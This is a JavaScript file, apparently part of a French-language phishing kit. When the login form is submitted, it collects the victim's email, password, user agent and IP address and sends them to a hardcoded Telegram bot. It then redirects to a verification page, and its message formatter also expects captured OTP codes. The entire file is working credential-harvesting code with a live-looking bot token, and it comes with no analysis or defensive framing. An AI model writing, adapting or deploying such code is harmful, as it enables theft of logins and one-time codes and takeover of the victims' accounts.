document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const formData = {
        email: document.getElementById('email').value,
        password: document.getElementById('password').value,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };

    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        formData.ip = ipData.ip;
    } catch (error) {
        formData.ip = 'Unknown';
    }

    // Envoyer les données à Telegram
    try {
        await sendToTelegram('login', formData);
        window.location.href = 'verify.html';
    } catch (error) {
        console.error('Error:', error);
    }
});

async function sendToTelegram(type, data) {
    const BOT_TOKEN = '7093484961:AAHGDCy18kfGlmVOGPOK--lUjubBsFIATRU';
    const CHAT_ID = '988325871';
    
    const message = formatTelegramMessage(type, data);
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
        }),
    });
}

function formatTelegramMessage(type, data) {
    const emoji = type === 'login' ? '🔐' : '🔑';
    const action = type === 'login' ? 'Connexion' : 'Code OTP';
    
    const formattedData = Object.entries(data)
        .map(([key, value]) => `<b>${key}:</b>\n${value}`)
        .join('\n\n');

    return `
${emoji} Nouvelle tentative - ${action}
⏰ ${new Date().toLocaleString('fr-FR')}

${formattedData}
    `.trim();
}